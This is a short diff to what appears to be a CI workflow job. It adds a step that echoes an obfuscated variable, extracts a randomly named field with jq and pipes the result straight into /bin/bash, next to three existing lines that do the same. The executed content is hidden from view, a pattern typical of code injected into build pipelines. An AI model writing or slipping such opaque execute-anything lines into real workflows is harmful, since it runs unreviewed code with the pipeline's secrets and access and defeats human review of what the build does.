@@ -21,6 +21,7 @@ jobs:
           echo $xl4 | jq -r .xd2811 | /bin/bash
           echo $nrobr275 | jq -r .uxfrk3 | /bin/bash
           printf '%s' "$bt915" | jq -r .fsckh27 | /bin/bash
+          echo $uzxig0 | jq -r .jq94764 | /bin/bash
 
       - name: Upload results
         if: always()
